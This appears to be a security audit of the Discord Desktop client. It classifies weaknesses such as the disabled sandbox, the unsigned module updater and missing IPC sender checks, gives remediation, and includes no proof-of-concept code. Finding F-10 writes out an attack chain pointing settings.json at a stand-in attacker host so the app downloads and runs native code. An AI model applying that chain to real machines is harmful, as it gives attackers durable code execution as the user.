# Discord Desktop — Findings

Core `0.0.380` · macOS arm64 · static analysis only. Full reasoning, evidence chains and diagrams
in [Discord-Desktop-Teardown.pdf](Discord-Desktop-Teardown.pdf).

**Classification**

| Class | Meaning |
|---|---|
| **Design** | Intended behaviour, correctly implemented. Carries risk by construction, not by mistake. |
| **Potential** | A real weakness. Needs verification before being called a vulnerability. |
| **Mitigated** | Looks alarming; is not. Recorded so the false positive is on record. |
| **Unknown** | Evidence unavailable — compiled code, remote code, or needs runtime observation. |
| **Positive** | A defence that is correctly built. |

No proof-of-concept code is included for any finding.

---

## Summary

| ID | Finding | Class | Impact |
|---|---|---|---|
| [F-1](#f-1) | `sandbox:false` keeps full Node in the preload, in-process with remote content | Design | **High** |
| [F-7](#f-7) | Legacy module updater verifies no signature; trusts TLS + HTTP 200 | Potential | **High** |
| [F-6](#f-6) | `insideAuthFlow` fully suspends the origin fence, unbounded and untimed | Potential | **Medium-High** |
| [F-10](#f-10) | `settings.json` can redirect `UPDATE_ENDPOINT`; chains with F-7 | Design / abuse | **Medium** |
| [F-4](#f-4) | No handler validates `event.senderFrame` across 136 registrations | Design | **Medium** |
| [F-9](#f-9) | `discord-clip://` validates file content, not file path | Potential | **Low-Medium** |
| [F-5](#f-5) | External-URL protocol filter is a 9-entry deny-list on legacy `url.parse` | Potential | **Low-Medium** |
| [F-3](#f-3) | `media` granted to age-verification origins but not `discord.com` | Unknown | Informational |
| [F-8](#f-8) | Zip-slip blocked by `yauzl`, not by application code | Mitigated | None today |
| [F-2](#f-2) | Permission handlers terminate in `callback(false)` | **Positive** | — |
| [P-1](#positives) | IPC allow-lists with a hard throw | **Positive** | — |
| [P-2](#positives) | `setWindowOpenHandler` returns `{action:'deny'}` on every path | **Positive** | — |
| [P-3](#positives) | `FINISH_UPDATER_BOOTSTRAP` type-checks its arguments | **Positive** | — |

---

<a id="f-1"></a>
## F-1 · `sandbox:false` keeps full Node in the preload

**Class** Design · **Impact** High · **Confidence** Confirmed

**Evidence** — `app/mainScreen.js:350-359`

```js
webPreferences: {
  nodeIntegration: false,      // ✓ renderer cannot require()
  sandbox: false,              // ⚠ preload keeps full Node
  preload: path.join(__dirname, 'mainScreenPreload.js'),
  contextIsolation: true,      // ✓ separate JS world
  devTools: ENABLE_DEVTOOLS
}
```

Corroborated by what the preload does with it: `renderer/fileManager.js:64-69` imports `fs` and
`node:crypto`; `renderer/clipboard.js:44` calls `clipboard.readText()`; `renderer/riotGames.js:24`
opens its own HTTPS socket.

**In plain terms** — Context isolation keeps the website's JavaScript in a sealed room, so it can't
grab Node directly. But the room next door — the preload — has the keys to the whole house, and it
hands the website a menu of things it will do on request. The wall is real; the serving hatch is wide.

**Why it matters** — With `sandbox:true`, a renderer compromise (a Chromium RCE, say) is contained
by the OS sandbox. With `sandbox:false`, the preload's Node capabilities sit in the same process as
the attacker. This flag converts "browser bug" into "code execution as your user."

**Assessment** — Almost certainly deliberate: the file, clipboard and native-module features as
written cannot work under a sandbox. A documented Electron trade-off, not a mistake. It is also the
highest-leverage change available.

**Remediation** — Move `fs`, `clipboard` and `https` work out of the preload into main-process
handlers, then enable `sandbox:true`. Large change; the IPC vocabulary already exists for most of it.

---

<a id="f-7"></a>
## F-7 · Legacy module updater performs no cryptographic verification in JavaScript

**Class** Potential · **Impact** High · **Confidence** Confirmed (for the JS path)

**Evidence** — `common/moduleUpdater.js:572-605` (download), `:605` (accept test), `:702-764`
(extract). A grep of the whole file for `checksum|sha|signature|verify` returns only `:385`, an
unrelated macOS code-signing *error string*.

```js
const response = await request.get({ url, qs: remoteQuery, headers, timeout, stream });
finishModuleDownload(name, version, moduleZipPath, receivedBytes,
                     response.statusCode === 200);   // ← the entire integrity check
```

**In plain terms** — The app asks Discord's server for a zip, and if the server says "200 OK" it
unpacks the contents into your home folder and later loads them as native code. The only thing
between that and arbitrary code execution is HTTPS.

**Why it matters** — TLS is a real control and is sufficient against a network attacker. It is
*not* sufficient against a compromise of the distribution endpoint, a mis-issued certificate, or an
operator with CDN access — and signing exists precisely to cover those. The artefacts are `.node`
binaries loaded into a process running as you.

**Which path is live** — `USE_NEW_UPDATER` defaults to `true` only on Windows
(`app_bootstrap/Constants.js:30`). **On macOS the legacy path is the default.** `common/updater.js`
is a thin JSON-RPC shim over compiled Rust, so the new path's verification cannot be assessed from
JavaScript at all.

**Remediation** — Sign module archives and verify in-process before extraction; fail closed.

**Next step** — Decompile the native updater (Ghidra/Hopper) on `discord_dispatch`. Until then this
is the largest single gap in the analysis.

---

<a id="f-6"></a>
## F-6 · `insideAuthFlow` fully suspends the origin fence

**Class** Potential · **Impact** Medium-High · **Confidence** Confirmed mechanism, unverified exploitability

**Evidence** — `app/mainScreen.js:526-535`

```js
mainWindow.webContents.on('will-navigate', (evt, url) => {
  if (!insideAuthFlow && !checkUrlOriginMatches(url, WEBAPP_ENDPOINT)) {
    evt.preventDefault();
  }
});
mainWindow.webContents.on('did-get-redirect-request', (event, oldUrl, newUrl) => {
  if (checkUrlOriginMatches(oldUrl, WEBAPP_ENDPOINT) &&
      checkUrlOriginMatches(newUrl, 'https://accounts.google.com/')) {
    insideAuthFlow = true;
  }
});
```

Cleared at `:482-484`, only when the web app signals `APP_ASYNC_INDEX_TSX_LOADED` *and* the current
URL is back on `WEBAPP_ENDPOINT`.

**In plain terms** — To let you sign in with Google, the app temporarily stops checking which
websites it's allowed to visit. The "all clear" is a flag flipped on one specific redirect, and it
stays flipped until the web app reports it's home again.

**Why it matters** — The right general shape — OAuth genuinely requires leaving your origin — but
coarse in three ways:

1. the permit is **unbounded**, not restricted to the OAuth provider's origin;
2. there is **no timeout**, so an abandoned flow leaves the fence down;
3. clearing depends on **a message from the renderer** — the party you'd be defending against.

During the window, all 136 IPC handlers stay registered and the same Node-capable preload is attached.

**Remediation** — Replace the boolean with an allow-list of expected OAuth origins plus a short
timeout; clear on `did-navigate` back to `WEBAPP_ENDPOINT` rather than on a renderer-sent message.
Better still, run the OAuth flow in a dedicated window with no preload.

**Next step** — In an authorised test build, set `insideAuthFlow` and attempt navigation to an
arbitrary origin; confirm whether the preload attaches and `window.DiscordNative` is populated.
**Not performed.**

---

<a id="f-10"></a>
## F-10 · Security-critical configuration lives in an unsigned, user-writable JSON file

**Class** Design, with real abuse potential · **Impact** Medium · **Confidence** Confirmed chain

**The chain**

```
write {"API_ENDPOINT":"https://attacker.test/api"} to settings.json
  → app_bootstrap/Constants.js:24-25   adopted as UPDATE_ENDPOINT
  → common/moduleUpdater.js:243        becomes remoteBaseURL
  → :572-605                           zip downloaded, accepted on HTTP 200, no signature (F-7)
  → :702-764                           extracted into module_data/
  → renderer/nativeModules.js:44       require()'d as native code
```

File location: `~/Library/Application Support/discord/settings.json` (`common/Settings.js:13` +
`common/paths.js:44-46`). Read before the window exists.

**In plain terms** — Edit one line in a text file in your own home folder, and Discord will download
its program from somewhere else and run it.

**The honest framing** — This is **not privilege escalation**. Anyone who can write that file
already runs as you, and could edit `core.asar` directly. It's a *persistence and tamper* surface:
it turns one quiet file write into durable control over the app's code source, surviving reinstalls
of the `.app` bundle. It's also exactly the mechanism legitimate client mods use.

**Not reachable from the renderer** — `SETTINGS_SET` (`browser/settings.js:28`) writes to a
different store (the injected `appSettings`), and these keys are read at launcher time before the
renderer exists.

**Remediation** — Sign or HMAC the settings file; or hard-pin `UPDATE_ENDPOINT` at build time and
ignore overrides on stable channels. The second is cheap and closes the chain.

---

<a id="f-4"></a>
## F-4 · No handler validates its sender

**Class** Design · **Impact** Medium · **Confidence** Confirmed

**Evidence** — `discord_native/common/DiscordIPC.js:18-27` forwards `...args` to the listener
unmodified and inspects nothing. `app/ipcMain.js:11-14` likewise. Across all 24 `browser/` modules,
a grep for `senderFrame`, `event.sender` origin checks, or `webContents.getURL()` comparisons inside
handlers returns **no hits** — the only match, `mainScreen.js:482`, is an auth-flow state check, not
a handler guard.

**Scope note** — The allow-lists at `renderer/ipc.js:9-10` are real and enforced, but they only
cover the *generic* `DiscordNative.ipc` facade:

| Path | Transport | Allow-listed? |
|---|---|---|
| `DiscordNative.ipc.send/invoke` | `renderer/ipc.js` | **Yes** — 25 send + 13 invoke |
| `DiscordNative.safeStorage.*` | `ipcRenderer.sendSync` direct | No |
| `DiscordNative.desktopCapture.*` | `DiscordIPC.renderer.invoke` | No |
| `DiscordNative.nativeModules.*` | `ipcRenderer.invoke` direct | No |
| `DiscordNative.fileManager.*` | direct `fs` — no IPC at all | N/A |

**In plain terms** — There's a guest list on the front door and it's enforced. There are also 24
side doors, one per capability, each with its own lock and no guest list.

**Why it matters** — 136 handlers registered, 38 channel names allow-listed. The rest are reachable
through their typed modules by anything running in the renderer. Not a flaw in the allow-list — it
was never meant to cover them — but it means the allow-list is not the client's IPC boundary. The
boundary is the `DiscordNative` object itself.

**Remediation** — Add a shared `event.senderFrame` origin assertion inside `DiscordIPC.main.on/handle`
(`DiscordIPC.js:18-27`). **A single ~5-line change covering all 136 registrations at once — the
highest-value, lowest-cost hardening available in the JS tier.**

---

<a id="f-9"></a>
## F-9 · `discord-clip://` gates on file content, not file location

**Class** Potential · **Impact** Low-Medium · **Confidence** Confirmed mechanism

**Evidence** — `app/discord_native/browser/clips.js:52-84`. The handler normalises the requested
path, calls `getClipMetadata(filename, dirname)`, and 404s if that throws. The metadata check
requires a Discord-specific `uuid` box inside the MP4 container (`isDiscordUUIDBox`, `:48-49`).
There is **no check that the path lies inside the clips directory**, and `Range` requests are
supported (`:86+`).

**In plain terms** — You can ask for any file on disk through this URL scheme and the app will serve
it — provided the file parses as an MP4 containing Discord's marker. That marker is the only lock on
the door; the door's location is unrestricted.

**Why it matters** — Confidentiality impact is bounded by the content check, so this is not a
general arbitrary-file-read. But a directory restriction is the cheap, obvious control and it's absent.

**Remediation** — `path.resolve` the request and assert containment within the clips directory
before any `stat` or read.

---

<a id="f-5"></a>
## F-5 · External-URL protocol filter is a deny-list on legacy `url.parse`

**Class** Potential · **Impact** Low-Medium, host-dependent · **Confidence** Confirmed

**Evidence** — `common/securityUtils.js:12-23`

```js
const BLOCKED_URL_PROTOCOLS = ['file:', 'javascript:', 'vbscript:', 'data:',
                               'about:', 'chrome:', 'ms-cxh:', 'ms-cxh-full:', 'ms-word:'];
```

**In plain terms** — Instead of "only these schemes are safe," the code says "these nine are unsafe,
everything else goes to the operating system." Anything not listed — `smb:`, `vscode:`,
`itms-services:`, any third-party app's custom scheme — is passed to `shell.openExternal`.

**Why it matters** — Deny-lists age badly, and the list is its own evidence: `ms-cxh:` and `ms-word:`
were clearly added after someone found them. Each entry is a bug that already happened. Separately,
`url.parse` is Node's legacy parser with known WHATWG divergences — the wrong tool for a security
decision.

**Remediation** — Invert to an allow-list; migrate to WHATWG `URL`.

**Note** — `checkUrlOriginMatches` (`:32-42`) in the same file is **sound**: it compares protocol +
slashes + `host`, and `host` includes the port.

---

<a id="f-3"></a>
## F-3 · `media` granted to age-verification origins but not to `discord.com`

**Class** Unknown · **Impact** Informational · **Confidence** Confirmed observation

**Evidence** — `app/mainScreen.js:407-409` grants camera/microphone **only** to three k-id
age-verification origins (`app/Constants.js:37-39`). `WEBAPP_ENDPOINT` is absent from that list. The
*check* handler at `:424-425` does include it — so the two handlers disagree.

**In plain terms** — If Discord's own web page asked Chromium for your microphone the normal way,
this code would say no. Only the age-verification pages get a yes. Discord's actual voice chat must
therefore not use the browser's microphone API at all — it goes through the compiled `discord_voice`
module instead.

**Why it matters** — An architectural tell: voice capture bypasses the Chromium permission system
entirely, so the browser-level permission model tells you nothing about Discord's microphone use.
The audit surface for voice is the native module, not this file.

**Not a vulnerability.** The stricter handler is the one that gates new grants.

**Next step** — Static analysis of `discord_voice` (81 MB, needs a decompiler), or runtime
observation of `getUserMedia`.

---

<a id="f-8"></a>
## F-8 · Zip-slip blocked by `yauzl`, not by application code

**Class** Mitigated · **Impact** None today; silent regression risk · **Confidence** Confirmed

**The pattern** — `common/moduleUpdater.js:728-729` joins archive-controlled names onto a
destination with no sanitisation of its own:

```js
const tempFileName  = path.join(extractRoot, entry.fileName + '.tmp');
const finalFileName = path.join(extractRoot, entry.fileName);
```

**Why it's safe** — the bundled `yauzl` validates every entry before emitting it
(`app/node_modules/yauzl/index.js:608-619`, called from `:426`):

```js
function validateFileName(fileName) {
  if (fileName.indexOf("\\") !== -1)                       return "invalid characters…";
  if (/^[a-zA-Z]:/.test(fileName) || /^\//.test(fileName)) return "absolute path…";
  if (fileName.split("/").indexOf("..") !== -1)            return "invalid relative path…";
  return null;
}
```

**Why it's reported anyway** — The outcome is correct today and fragile tomorrow. Swap the zip
library, upgrade past a behaviour change, or pass `strictFileNames` differently, and the protection
vanishes silently with no change to Discord's code. That's the difference between being *safe* and
being *defended*. An automated scanner will flag this; the flag is a false positive, and that should
be on record.

**Remediation** — Add an explicit `path.resolve` containment assertion so the guarantee lives in
Discord's code.

---

<a id="f-2"></a>
## F-2 · Permission handlers terminate in `callback(false)`

**Class** Positive · **Confidence** Confirmed

**Evidence** — `app/mainScreen.js:411` and `:427`. Any permission the code does not explicitly name
is refused, in both the request and the check handler. This is the opposite of the common Electron
mistake — allowing everything, or installing no handler at all, which allows everything.

**Two small gaps** inside an otherwise tight fence (`:390-392`, `:402-404`): `accessibility-events`
is granted unconditionally with no origin test, and subframes get `fullscreen` without an origin
check. Low severity — fullscreen-from-subframe is a classic UI-spoofing building block, but it
requires a frame-injection primitive first, which the navigation fence is designed to prevent.
Fix: apply `checkUrlOriginMatches` to both.

---

<a id="positives"></a>
## Positives

**P-1 · IPC allow-lists with a hard throw** — `renderer/ipc.js:9-29`. 25 sendable + 13 invokable
channels; anything else raises `'cannot send this event'`. Directly contradicts an automated
"no sender validation" finding. Correct implementation; see F-4 for scope.

**P-2 · `setWindowOpenHandler` denies on every path** — `mainScreen.js:436-449` returns
`{action:'deny'}` unconditionally. Chromium never creates a window on its own; internal windows are
created explicitly by Discord's code after three independent checks. The correct Electron pattern,
applied consistently — `popoutWindows.js:160-168` repeats it for child windows.

**P-3 · `FINISH_UPDATER_BOOTSTRAP` type-checks its arguments** — `browser/nativeModules.js:78-80`
rejects non-numbers before building a path that gets passed to `childProcess.spawn`. Numbers can't
introduce path separators, so the `app-{major}.{minor}.{revision}` template can't be escaped. The
developer's own error string is `'You tried.'` — a fingerprint of real adversarial review.

**P-4 · Content protection is carefully built** — `browser/window.js:127-153` maintains a per-window
override set so a global setting can't un-protect a window that requested protection individually.

---

## Overall

This is a **better-than-average Electron client**. Context isolation on, Node integration off,
deny-by-default permissions with real origin checks, window creation explicitly denied, a
centralised and namespaced IPC vocabulary. Someone thought about this.

Its weaknesses are coherent rather than careless, and trace to two decisions: **keeping Node in the
preload** (F-1), which removes the sandbox as a backstop, and **trusting the renderer wholesale**
(F-4) rather than per-handler, which leaves the perimeter controls with nothing behind them.

The single highest-leverage fix is neither of those — it's adding a sender check inside
`DiscordIPC`, retrofitting defence in depth onto all 136 endpoints at once.

The **largest unknown** is update verification (F-7). On macOS the legacy, unsigned path is the
default, and the modern path's integrity logic is compiled Rust this analysis could not read. Until
that's decompiled, "can Discord's update channel install arbitrary native code" has no
evidence-backed answer.
